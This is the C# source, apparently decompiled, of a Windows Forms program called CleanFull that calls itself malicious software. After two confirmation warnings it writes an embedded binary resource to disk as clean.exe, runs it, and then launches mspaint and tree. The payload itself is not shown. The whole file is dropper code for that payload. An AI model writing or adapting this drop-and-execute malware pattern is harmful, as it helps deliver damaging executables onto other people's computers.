using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using CleanFull.My;
using CleanFull.Properties;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CleanFull
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class Main : Form
	{
		// Token: 0x06000015 RID: 21 RVA: 0x0000235B File Offset: 0x0000055B
		public Main()
		{
			base.Load += this.Form1_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000237C File Offset: 0x0000057C
		private void Form1_Load(object sender, EventArgs e)
		{
			bool flag = Interaction.MsgBox("This program is a malicious software! It may cause the computer to malifunction. Are you sure you want to start it?", MsgBoxStyle.YesNo | MsgBoxStyle.Critical | MsgBoxStyle.Question, "Warning!") == MsgBoxResult.No;
			checked
			{
				if (flag)
				{
					base.Close();
				}
				else
				{
					bool flag2 = Interaction.MsgBox("LAST WARNING! Are you sure you want to execute this?", MsgBoxStyle.YesNo | MsgBoxStyle.Critical | MsgBoxStyle.Question, "WARNING!") == MsgBoxResult.No;
					if (flag2)
					{
						base.Close();
					}
					else
					{
						byte[] clean = Resources.clean;
						MyProject.Computer.FileSystem.WriteAllBytes(Application.StartupPath + "\\\\clean.exe", clean, false);
						Process.Start(Application.StartupPath + "\\\\clean.exe");
						int num = 0;
						do
						{
							Thread.Sleep(10);
							Application.DoEvents();
							num++;
						}
						while (num <= 500);
						Process.Start("mspaint.exe");
						Process.Start("tree");
					}
				}
			}
		}
    }
}
